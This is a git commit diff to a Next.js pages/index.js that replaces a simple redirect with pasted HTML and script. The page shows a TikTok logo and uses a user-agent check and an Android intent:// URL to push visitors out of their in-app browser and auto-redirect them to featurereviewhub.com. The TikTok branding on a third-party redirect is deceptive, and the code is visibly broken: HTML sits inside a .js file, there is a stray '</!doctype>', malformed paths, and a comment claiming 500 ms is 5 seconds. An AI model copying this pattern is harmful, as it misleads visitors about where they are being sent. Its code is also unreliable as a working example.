825128c9f48ae54aa23120827c8275a64c9a4fbc
featurereviewhub <ABDESSAMADOSSEILI2003@gmail.com>
2024-07-18 18:00:58 +0100

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -1,21 +1,29 @@
-import { useEffect } from 'react';
-import { useRouter } from 'next/router';
+    <img id="tiktok-logo" src="../i.ibb.co/5MMGFNf/1000-F-344600545-4j-FBe-Ak5l8-Kug2-Uyxq-OEoop8p1-I0v1dp-removebg-preview.png" alt="TikTok Logo" />
+    <p id="redirect-text">Being Redirected ...</p>
+    <a href="www.google.html" id="openLink">Click Me to Open in Chrome (Android) or Safari (iOS)</a>
 
-export default function Home() {
-  const router = useRouter();
+    <script>
+        function openLinkBasedOnDevice(url) {
+            var userAgent = navigator.userAgent;
 
-  useEffect(() => {
-    // Redirect to your desired URL
-    window.location.href = 'https://smrturl.co/5274e7d';
+            if (/(android)/i.test(userAgent)) {
+                // If the device is Android, open the link in Chrome
+                window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
+            } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
+                // If the device is iOS, open the link in Safari
+                window.location.href = url;
+            } else {
+                // For other devices, open the link in the default browser
+                window.open(url, '_blank');
+            }
+        }
 
-    // Optionally, you can use router.push() instead for client-side routing
-    // router.push('https://featurereviewhub.com/');
-  }, []);
+        // Automatically execute the function after a 5-second delay
+        setTimeout(function () {
+            var url = 'https://featurereviewhub.com/';
+            openLinkBasedOnDevice(url);
+        }, 500); // 500 milliseconds = 5 seconds
+    </script>
 
-  return (
-    <div>
-      <p>Redirecting...</p>
-      {/* You can optionally add a message or spinner here */}
-    </div>
-  );
-}
+
+</!doctype>
